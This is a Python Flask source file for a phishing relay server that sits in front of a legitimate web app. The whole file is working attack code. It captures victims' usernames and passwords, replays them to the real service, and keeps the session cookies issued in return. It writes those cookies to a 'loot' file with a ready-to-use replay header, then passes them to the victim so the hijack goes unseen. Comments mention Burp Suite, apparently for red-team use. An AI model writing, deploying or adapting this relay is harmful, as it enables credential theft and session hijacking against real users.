import json
import logging
import os
import re
import threading
from datetime import datetime, timezone

import requests
from flask import Flask, make_response, redirect, request

app = Flask(__name__)
logging.basicConfig(level=logging.INFO, format="%(message)s")

UPSTREAM_URL = os.environ["LEGITIMATE_INTERNAL_URL"]
# Browser-reachable address of the real app, used for the final redirect and for the Burp-ready replay URL in the loot record.
PUBLIC_URL = os.environ["LEGITIMATE_PUBLIC_URL"]
COOKIE_SECURE = os.getenv("COOKIE_SECURE", "false").lower() == "true"
REQUEST_TIMEOUT = 5

# Persisted on a named Docker volume so captured sessions survive
# see scripts/loot.sh.
LOOT_DIR = os.getenv("LOOT_DIR", "/app/loot")
LOOT_FILE = os.path.join(LOOT_DIR, "captured_sessions.jsonl")
_loot_lock = threading.Lock()

CSRF_RE = re.compile(r'name="csrf_token"\s+value="([^"]*)"')


def event(kind, username=None, **fields):
    payload = {
        "kind": kind,
        "username": username,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    payload.update(fields)
    app.logger.info(json.dumps(payload))


def loot(username, cookies):
    #Persist the exfiltrated session cookies for reuse in the Burp Suite
    os.makedirs(LOOT_DIR, exist_ok=True)
    record = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "username": username,
        "cookies": cookies,
        "replay_header": "; ".join(f"{k}={v}" for k, v in cookies.items()),
        "replay_url": f"{PUBLIC_URL}/workspace",
    }
    with _loot_lock:
        with open(LOOT_FILE, "a") as fh:
            fh.write(json.dumps(record) + "\n")
    return record


@app.post("/login")
def relay_login():
    email = request.form.get("username", "").strip()
    password = request.form.get("password", "")
    event("credentials_captured", email)

    upstream = requests.Session()

    try:
        get_resp = upstream.get(f"{UPSTREAM_URL}/login", timeout=REQUEST_TIMEOUT)
        match = CSRF_RE.search(get_resp.text)
        if not match:
            event("relay_error", email)
            return redirect("/?error=1")
        csrf_token = match.group(1)

        post_resp = upstream.post(
            f"{UPSTREAM_URL}/login",
            data={"username": email, "password": password, "csrf_token": csrf_token},
            allow_redirects=False,
            timeout=REQUEST_TIMEOUT,
        )
    except requests.RequestException:
        event("relay_error", email)
        return redirect("/?error=1")

    if post_resp.status_code != 302:
        event("login_denied_upstream", email)
        return redirect("/?error=1")

    # Exfiltrate: the real app just issued this cookie jar to US, believing
    # we were the victim's browser. Persist it, then log it in full.
    stolen = {c.name: c.value for c in upstream.cookies}
    record = loot(email, stolen)
    event(
        "session_hijacked",
        email,
        sid=stolen.get("sid", ""),
        replay_header=record["replay_header"],
        replay_url=record["replay_url"],
    )

    resp = make_response(redirect(f"{PUBLIC_URL}/workspace"))
    for name, value in stolen.items():
        resp.set_cookie(
            name,
            value,
            httponly=True,
            secure=COOKIE_SECURE,
            samesite="Strict",
            path="/",
        )
    return resp


@app.get("/health")
def health():
    return {"status": "ok"}


@app.after_request
def headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Cache-Control"] = "no-store"
    return response
